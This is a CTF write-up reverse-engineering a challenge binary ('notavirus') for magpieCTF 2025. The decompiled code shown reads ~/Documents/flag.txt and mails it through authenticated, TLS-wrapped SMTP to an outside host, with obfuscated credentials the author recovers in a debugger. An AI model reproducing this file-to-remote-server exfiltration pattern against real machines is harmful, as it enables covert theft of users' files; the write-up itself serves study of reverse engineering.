---
author: "fastcall"
title: "magpieCTF 2025 SMalwareTP challenge writeup"
date: "2025-03-03"
description: "more rev next year pls"
summary: "Write-up for all the SMalwawreTP RE challenge in magpieCTF 2025."
tags: ["re", "ctf"]
categories: ["writeups"]
ShowToc: true
draft: false
---

UofTCTF Members:
- \_\_fastcall (me): rev -- constantly complains about no windows rev
- White: literally every category -- gains dyslexia when trying to read flags
- Tyler_: pwn -- proof that hitting legs exponentially improves your pwning skills
- Toadytop: cryptography -- solves crypto to symphonies and jazz
- SteakEnthusiast: web -- studied his security midterm with this CTF instead, got 104%  

*The decompiled code in this write up may not match the exact disassembly, it has been manually beautified where appropriate for your reading pleasure.*

> Malware has been found on Christina Krypto's computer, it seems that it was uploaded around the time of her death. Investigate the binary to see if you can find something in relation to the perpetuator. It must be Kaylined, the rest of the suspects don't seem capable of making something of this sort. Analysts have also noted that the malware seems to somehow be communicating with something...

## Initial Analysis

We are given a single binary, `notavirus`. Loading the binary into the [industry standard disassembler](https://hex-rays.com/ida-pro) and decompiling it, after the many string mutations, we see a warning for the `ptr` variable that's passed to many functions along with emails and other strings.

![undefined value](/undefined_value.png)

There can be many reasons for this, but one of the most common I've seen is the decompiler getting confused at the calling convention or number of arguments passed to a function, mostly due to IDA's decompilation being lazy by default, in contrast to other tools. (this means that functions are only decompiled in IDA when you click into them)

A easy fix is to use the `Create C file` feature (`File -> Produce file -> Create C file)`, to force IDA to decompile every function in the binary in order to generate the file. After doing this and refreshing the decompilation, we find that the warning disappears and the functions now have the correct arguments, great!

![defined value](/defined_value.png)

Back to the start of the main function, we see many string manipulations that seem to create two char arrays passed to a mystery function.

```c
_BOOL8 __fastcall main(int argc, char **argv, char **envp)
{
  size_t v3;
  char *v4;
  char *v5;
  size_t v6;
  char *v7;
  size_t v8;
  char *v9;
  char *v10;
  void *ptr;

  v3 = strlen(s);
  v4 = stpcpy(&s[v3], src);
  v5 = stpcpy(v4, aI4gr1w);
  strcpy(v5, aBbnuj29x);
  sub_28B0(s);
  v6 = strlen(aErqure);
  v7 = stpcpy(&aErqure[v6], aEvatobg);
  strcpy(v7, aGbzgrkg);
  sub_2980(aErqure);
  sub_2A40(s, aErqure, barray_out);
  v8 = strlen(aTrrdn0);
  v9 = stpcpy(&aTrrdn0[v8], aJxig9);
  v10 = stpcpy(v9, a0iocl);
  strcpy(v10, aRhqhka);
  sub_2A40(aTrrdn0, aErqure, barray_out_2);
  sub_28B0(barray_out_2);
  if ( sub_27C0() )
  {
    puts("Failed to read the flag.");
    exit(1);
  }
  sub_3720("mxexfil.secard.ca", "4545", 0, 2, 0LL, &ptr);
  sub_39B0(ptr, 2, barray_out, barray_out_2);
```

Looking at the string constants referenced by the functions, they look like base64 chunks, but seem to out of order in the binary itself.

```
.data:000000000000A388 ; char aBbnuj29x[]
.data:000000000000A388 aBbnuj29x       db 'bBNuJ29x',0         ; DATA XREF: main+4E↑o
.data:000000000000A391 ; char aI4gr1w[]
.data:000000000000A391 aI4gr1w         db 'I4GR1w',0           ; DATA XREF: main+3F↑o
.data:000000000000A398 ; char src[]
.data:000000000000A398 src             db 'RTwFA',0            ; DATA XREF: main+2E↑o
.data:000000000000A39E                 align 20h
.data:000000000000A3A0 ; char s[]
.data:000000000000A3A0 s               db 'a2GeN',0    
```


The `sub_28B0`, `sub_2980` and related functions doing the string mutations seem pretty optimized and complex on first glance, in the interest of a first blood I opted to switch to dynamic analysis and dump the values of the two output arrays after they executed.

```
$ ./notavirus
Error: Could not open /home/user/Documents/flag.txt.
Failed to read the flag.
$ echo $?
1
```

However, when trying to run the binary, we seem to hit the condition in the above if statement.

```c
int64_t sub_27C0()
{
  char *username;
  FILE *handle;
  char flag_str[1048];

  username = getenv("HOME");
  if ( username )
  {
    snprintf(flag_str, 1024, "%s/Documents/flag.txt", username);
    handle = fopen(flag_str, "r");
    if ( handle )
    {
      if ( fgets(flag_buffer, 1024, handle) )
      {
        fclose(handle);
        return 0;
      }
      fprintf(stderr, "Error: Could not read from %s.\n", flag_str);
      fclose(handle);
    }
    else
    {
      fprintf(stderr, "Error: Could not open %s.\n", flag_str);
    }
  }
  else
  {
    fwrite("Error: HOME environment variable not set.\n", 1, 42, stderr);
  }
  return 1;
}
```

We can just create the directory and file `~/<username>/Documents/flag.txt` to pass this check and proceed. (the file cannot be empty)

![ida breakpoint](/ida-breakpoint-1.png)

After placing a breakpoint on the function, we see the two arrays passed contain base64 encoded data:
```
.bss:000055555555E500 ; char barray_out[32]
.bss:000055555555E500 barray_out db 'c', '2', 'V', 'u', 'Z', 'G', 'V', 'y', 'Q', 'G', 'V', '4', 'Y', 'W'
.bss:000055555555E500                                         ; DATA XREF: main+B↑o
.bss:000055555555E50E db '1', 'w', 'b', 'G', 'U', 'u', 'Y', '2', '9', 't', 0, 0, 0, 0, 0, 0
.bss:000055555555E51E db 0, 0
.bss:000055555555E520 ; char barray_out_2[32]
.bss:000055555555E520 barray_out_2 db 'V', 'G', 'h', 'p', 'c', '0', 'l', 'z', 'T', 'm', '9', '0', 'V', 'G'
.bss:000055555555E520                                         ; DATA XREF: main+2↑o
.bss:000055555555E52E db 'h', 'l', 'R', 'm', 'x', 'h', 'Z', 'w', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
```

We can easily copy this out of IDA by clicking the label and pressing `Shift+E` (this seems unmapped if you use the new keybindings in IDA 9, do `Edit -> Export Data)

Decoding this using Cyberchef, we find that the values are `sender@example.com` and `ThisIsNotTheFlag`. Feeling a bit disappointed, I went back to IDA to analyze these functions. 

```c
// {...
v12 = socket(addr_info->ai_family, addr_info->ai_socktype, addr_info->ai_protocol);
*(v10 + 4) = v12;
if ( v12 >= 0 )
{
  if ( connect(v12, addr_info->ai_addr, addr_info->ai_addrlen) >= 0 )
    break;
  close(*(v10 + 4));
// ...}
```

```c
if ( !sub_555555557090(v10, "EHLO smtp\r\n", 0xBuLL) )
  sub_5555555574F0(v10);
if ( *(v10 + 128) )
  goto LABEL_21;
if ( a3 )
  return 0LL;
if ( sub_555555557090(v10, "STARTTLS\r\n", 0xAuLL) )
```

In `sub_7720`, we find a low level socket connection being made, and some interesting strings that mention `smtp`. I connected to this socket using the domain and port passed into this function, `mxexfil.secard.ca:4545`. I'll come back to that `STARTTLS` command later, I missed it at first.

```
$ nc mxexfil.secard.ca 4545
220 npmtemp smtp4dev ready
help
500 Command unrecognised
ehlo
250-HEYYYOOO NICE 2 MEET U!!.
250-8BITMIME
250-SIZE
250-SMTPUTF8
250-STARTTLS
250-AUTH=CRAM-MD5 PLAIN LOGIN
250 AUTH CRAM-MD5 PLAIN LOGIN
```

This seems like a smtp server alright! Let's move onto the second function. 

```c
int64_t sub_79B0(int64_t handle, int auth_type, const char *array_1, const char *array_2) {
	// ...
	if ( auth_type == 2 )
		// ...
		v32 = "AUTH PLAIN ";
	if ( auth_type == 3 )
		// ...
		v14 = "AUTH LOGIN ";
	else {
		if (sub_7090(handle, "AUTH CRAM-MD5\r\n", 0xF))
		// ...
	}
	// ...
}
```

This function is even longer, but the second parameter `auth_type` is the immediate value `2`, and the code will branch based on this parameter. We can ignore every other branch in this function. After googling these strings and [learning about the smtp protocol](https://mailtrap.io/blog/smtp-commands-and-responses/), I realized that this function is choosing the authentication method to the SMTP server, and this binary will always use `AUTH PLAIN`. 

In this mode, the username and password are concatenated together, then encoded in base64 and then sent to the server. Encoding `sender@example.comThisIsNotTheFlag` in base64, gives us `c2VuZGVyQGV4YW1wbGUuY29tVGhpc0lzTm90VGhlRmxhZw`, and I tried to pass this to the smtp server through my netcat connection.

```
$ nc mxexfil.secard.ca 4545
220 npmtemp smtp4dev ready
AUTH PLAIN c2VuZGVyQGV4YW1wbGUuY29tVGhpc0lzTm90VGhlRmxhZw
535 Bad Base64 data
```

I couldn't get the authentication to work, and just decided to dump the value after it had been created. This gave me `AGMyVnVaR1Z5UUdWNFlXMXdiR1V1WTI5dABWR2hwYzBselRtOTBWR2hsUm14aFp3`, and I then realized that two null bytes were added, one in between the username and password, and one at the start of the username.

```
$ nc mxexfil.secard.ca 4545
220 npmtemp smtp4dev ready
AUTH PLAIN AGMyVnVaR1Z5UUdWNFlXMXdiR1V1WTI5dABWR2hwYzBselRtOTBWR2hsUm14aFp3
235 HEYYO WELCOME BACK FLAG STEEELR
```

This time, it worked! I couldn't find anything interesting in the next 3 functions other than the data passed to them, so I went to go analyze the last function, which interesting has the `flag_buffer` passed to it!

```c
if ( sub_5555555575A0(handle, "MAIL FROM", *v5))
    return *(handle + 128);
if ( sub_5555555575A0(handle, "RCPT TO", *v10))
	return *(handle + 128);
if ( sub_555555557090(handle, "DATA\r\n", 6uLL))
	return *(handle + 128);
```

The challenge clicked in my head once I saw what was happening here. The client was sending an email to server, to which the server will likely respond with the flag. I wanted to continue reversing the binary and re-implement the SMTP commands, but after playing around with the server some more, I ran into a problem:

```
$ nc mxexfil.secard.ca 4545
220 npmtemp smtp4dev ready
AUTH PLAIN AGMyVnVaR1Z5UUdWNFlXMXdiR1V1WTI5dABWR2hwYzBselRtOTBWR2hsUm14aFp3
235 HEYYO WELCOME BACK FLAG STEEELR
MAIL FROM xorigin33@yandex.ru
451 Secure connection required
```

Secure connection required? Looking up this error message, it turns out we need to use TLS in order to send emails. Remember `STARTTLS`? Here it comes! 

```
$ nc mxexfil.secard.ca 4545
220 npmtemp smtp4dev ready
STARTTLS
220 Ready to start TLS
```

Once again in the interest of speed, I thought of a much easier way to solve this challenge, *dynamically*. Since this client is fully implemented, we can "MITM" the data sent between the client and server, and hopefully grab the flag when its sent from the server!

Since this is a socket connection, I immediately looked for cross references to `recv` when I remembered that the smtp connection was encrypted with TLS. I realized that OpenSSL was being used to do the TLS after seeing `SSL_read` called after `recv`, and realized I could place a breakpoint after `SSL_read` to see what encrypted data was received!

![ida breakpoint 2](/ida-break-point-2.png)

Looking at the function prototype for `SSL_read` on it's man page, we see that the written buffer is in the 2nd argument (the `r12` register). `int SSL_read(SSL *ssl, void *buf, int num);`. 

```
[heap]:0000555555565120 a250HeyyyoooNic db '250-HEYYYOOO NICE 2 MEET U!!.',0Dh,0Ah
[heap]:000055555556513F db '250-8BITMIME',0Dh,0Ah
[heap]:000055555556514D db '250-SIZE',0Dh,0Ah
[heap]:0000555555565157 db '250-SMTPUTF8',0Dh,0Ah
[heap]:0000555555565165 db '250-AUTH=CRAM-MD5 PLAIN LOGIN',0Dh,0Ah
[heap]:0000555555565184 db '250 AUTH CRAM-MD5 PLAIN LOGIN',0Dh,0Ah
[heap]:00005555555651A3 db ' PLAIN LOGIN',0Dh,0Ah,0
```

Watching this register as we continue past hits on this breakpoint, and we can watch the encrypted traffic being received by our client. (I'm showing the traffic truncated, the actual traffic is much longer)

```
db '250 New message started',0Dh,0Ah
db '250 Recipient accepted',0Dh,0Ah
db '354 End message with period',0Dh,0Ah
db '250 YAYYY MAIL SENT MagpieCTFFLAG Sup3rM41LTr4nsp0rtPr0t0c47l',0Dh
```

Solved! `magpieCTF{Sup3rM41LTr4nsp0rtPr0t0c47l}`
## Conclusion

This was definitely my favorite RE challenge in this CTF! By the way, it was indeed not a virus :P
